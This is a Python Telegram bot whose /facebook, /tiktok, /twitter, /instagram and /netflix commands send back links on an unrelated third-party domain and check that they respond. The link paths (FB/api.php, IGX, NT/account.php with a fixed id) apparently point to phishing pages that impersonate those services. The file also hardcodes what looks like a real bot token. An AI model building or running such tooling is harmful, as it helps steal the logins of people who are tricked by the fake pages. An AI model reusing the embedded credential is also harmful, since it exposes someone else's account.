from typing import Final
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
import httpx  # For making HTTP requests

# Replace with your actual bot token
TOKEN: Final = '7706441917:AAFR7Mb7vGb2PjtADes1Fktdr0HfkEj61UA'
BOT_USERNAME: Final = '@GxbdtgdgvBot'

# Base URL template — replace with correct values if needed
BASE_URL = "https://season-event.com.tr/^*Y"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Hello! I'm your bot. Use /help to see available commands.")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        'How can I assist you?\n'
        '/facebook\n'
        '/tiktok\n'
        '/twitter\n'
        '/instagram\n'
        '/netflix'
    )

async def unknown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("I don't understand that command. Please use /help to see available options.")

async def send_status_response(update: Update, platform: str, urls: list[str]):
    try:
        async with httpx.AsyncClient() as client:
            response = await client.post(urls[0])  # You can use the first URL to check status.
            status_code = response.status_code

        for url in urls:
            await update.message.reply_text(f"{platform}: {url} - Status: {status_code}")

    except Exception as e:
        await update.message.reply_text(f"An error occurred while checking {platform}: {e}")

async def facebook(update: Update, context: ContextTypes.DEFAULT_TYPE):
    urls = [
        f"{BASE_URL}/FB/api.php?id=934142412",
        f"{BASE_URL}/FB/?id=934142412"
    ]
    await send_status_response(update, "Facebook", urls)

async def tiktok(update: Update, context: ContextTypes.DEFAULT_TYPE):
    urls = [
        f"{BASE_URL}/TK/?id=934142412",
        f"{BASE_URL}/TK2/?id=934142412"
    ]
    await send_status_response(update, "TikTok", urls)

async def twitter(update: Update, context: ContextTypes.DEFAULT_TYPE):
    urls = [
        f"{BASE_URL}/TW/?id=934142412"
    ]
    await send_status_response(update, "Twitter", urls)

async def instagram(update: Update, context: ContextTypes.DEFAULT_TYPE):
    urls = [
        f"{BASE_URL}/IGX/?id=934142412",
        f"{BASE_URL}/IgV2/?id=934142412"
    ]
    await send_status_response(update, "Instagram", urls)

async def netflix(update: Update, context: ContextTypes.DEFAULT_TYPE):
    urls = [
        f"{BASE_URL}/NT/?id=934142412",
        f"{BASE_URL}/NT/account.php?id=934142412"
    ]
    await send_status_response(update, "Netflix", urls)

def main():
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("facebook", facebook))
    application.add_handler(CommandHandler("tiktok", tiktok))
    application.add_handler(CommandHandler("twitter", twitter))
    application.add_handler(CommandHandler("instagram", instagram))
    application.add_handler(CommandHandler("netflix", netflix))

    application.add_handler(MessageHandler(filters.COMMAND, unknown))  # Handle unknown commands
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, unknown))  # Handle non-command messages

    application.run_polling()

if __name__ == '__main__':
    main()
